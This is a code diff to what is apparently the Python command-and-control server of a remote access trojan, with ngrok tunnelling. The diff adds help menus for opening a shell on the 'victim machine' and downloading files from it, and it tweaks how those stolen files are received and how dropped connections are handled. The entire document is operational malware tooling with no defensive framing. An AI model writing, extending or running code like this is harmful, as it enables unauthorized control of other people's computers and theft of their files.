@@ -8,6 +8,7 @@ import os
 import argparse
 from pyngrok import ngrok
 import json
+import base64
 
 connections = []
 addresses = []
@@ -217,6 +218,20 @@ class ClientHandler():
             except:
                 print("Error Accepting Connections")
 
+class HelpCenter():
+    def sessionHelp(self) -> None:
+        """
+        Handles the overall help menu when in session
+        
+        Returns:
+            str: the help content
+        """
+        
+        return f"Modules:\n     - {Fore.BLUE}help{Style.RESET_ALL}: Shows commands for each module\n     - {Fore.BLUE}shell{Style.RESET_ALL}: Opens a shell on the victim machine\n     - {Fore.BLUE}exit{Style.RESET_ALL}: Exits the session\n"
+
+    def shellModuleHelp(self) -> None:
+        return f"Shell Module Help Menu:\n     - {Fore.BLUE}help{Style.RESET_ALL}: Shows this help menu\n     - {Fore.BLUE}download{Style.RESET_ALL}: Download files from victim machine\n     - {Fore.BLUE}exit{Style.RESET_ALL}: Exits the shell\n"
+
 class Commands():
     def sysinfo(self, data: bytes) -> None:
         """
@@ -266,23 +281,24 @@ class Commands():
 
             # Save the File
             with open(os.path.join(dirname, filename[9:]), 'wb') as file:
+                print("Downloading File...")
                 # Get File Data
-                data = conn.recv(20480)
+                data = conn.recv(1024)
                 conn.settimeout(1)
 
                 # Write the Data to the File
                 while data:
                     file.write(data)
                     try:
-                        data = conn.recv(20480)
-                    except socket.timeout:
+                        data = conn.recv(1024)
+                    except socket.timeout as e:
                         break
 
                 # Reset the File
                 conn.settimeout(None)
                 file.close()
-
-class CommandCenter(Commands):
+        
+class CommandCenter(Commands, HelpCenter):
     def __init__(self, sock: socket.socket) -> None:
         """
         Handles all the Commands
@@ -312,7 +328,7 @@ class CommandCenter(Commands):
                 if command == 'sysinfo':
                     self.conn.send(str.encode('sysinfo'))
                     self.sysinfo(self.conn.recv(20480))
-                elif command == 'exit session':
+                elif command == 'exit':
                     self.conn = None
                     self.targetSet = False
                     self.cli = ">> "
@@ -323,19 +339,22 @@ class CommandCenter(Commands):
                         self.conn.send(str.encode('shell'))
                         while True:
                             command = input("$ ")
-                            print(command)
                             if command == 'exit':
                                 self.conn.send(str.encode(command))
                                 break
                             elif command[:9] == 'download ':
                                 self.conn.send(str.encode(command))
                                 self.Shell().download(command, self.conn)
+                            elif command == 'help':
+                                print(self.shellModuleHelp())
                             elif command != "":
                                 data = self.Shell().run(command)
                                 self.conn.send(str.encode(data))
                                 print(self.conn.recv(20480).decode())
                     except BrokenPipeError:
                         print("Connection Disrupted")
+                elif command == 'help':
+                    print(self.sessionHelp())
                 else:
                     try:
                         self.conn.send(str.encode(command))
@@ -395,8 +414,13 @@ class CommandCenter(Commands):
         
                     # If the Connection returns nothing, then remove it
                     except:
-                        del connections[i]
-                        del addresses[i]
+                        try:
+                            del connections[i]
+                            del addresses[i]
+                        except Exception as e:
+                            logging.error(f"Error Occurred: {e}")
+                            pass
+
                 print("\n")
 
             # If None, let the user know
